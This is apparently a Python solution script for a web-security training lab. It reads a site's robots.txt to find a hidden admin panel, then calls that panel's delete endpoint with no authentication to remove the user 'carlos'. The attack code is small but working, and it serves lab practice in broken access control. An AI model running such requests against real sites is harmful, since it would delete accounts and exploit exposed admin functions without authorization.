import requests
from colorama import Fore
import sys
import time

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 main.py <Lab_URL>")
        sys.exit(1)

    Lab_URL = sys.argv[1]    
    url = Lab_URL + '/robots.txt'
    r = requests.get(url)
    time.sleep(5)
    print(Fore.CYAN + "Allowed List in our robots.txt:", r.text)
    time.sleep(5)
    print(Fore.CYAN + "Accessing the admin panel through /administrator-panel")
    admin_url = Lab_URL + '/administrator-panel'
    time.sleep(5)
    print(Fore.CYAN + "Deleting the user called carlos")
    params = {
        "username": "carlos"
    }
    delete_carlos_url = admin_url + '/delete'
    r = requests.get(delete_carlos_url,  params=params)
    if r.status_code == 302:
        print(Fore.CYAN + "Carlos user got deleted and you have solved the lab !!!")
    else:
        print(Fore.RED + "You made a mistake")
  
if __name__ == '__main__':
   main()
